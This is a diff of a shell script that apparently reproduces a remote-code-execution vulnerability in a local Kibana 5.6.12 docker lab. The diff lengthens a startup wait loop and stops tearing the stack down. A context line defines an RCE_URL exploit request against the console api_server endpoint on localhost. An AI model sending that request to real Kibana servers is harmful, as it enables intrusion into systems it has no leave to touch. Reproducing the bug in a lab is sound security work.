@@ -12,8 +12,8 @@ PY=$WORK/.venv/bin/python
 export PATH="$HOME/homebrew/bin:$PATH"
 mkdir -p "$EVID"
 
-wait_up() {  # wait for kibana :5601 to answer /api/status (max 480 s)
-  for i in $(seq 1 160); do
+wait_up() {  # wait for kibana :5601 to answer /api/status (max 1200 s)
+  for i in $(seq 1 400); do
     code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 http://localhost:5601/api/status 2>/dev/null || echo 000)
     [ "$code" = "200" ] && return 0
     sleep 3
@@ -25,7 +25,7 @@ RCE_URL='http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_
 
 echo "== 01: start vulnerable environment (Kibana 5.6.12) =="
 cd "$CVEDIR"
-docker compose down >/dev/null 2>&1
+# keep the already-running (and warm) stack; only start it if needed
 docker compose up -d > /tmp/cve_compose_up.log 2>&1
 wait_up
 {
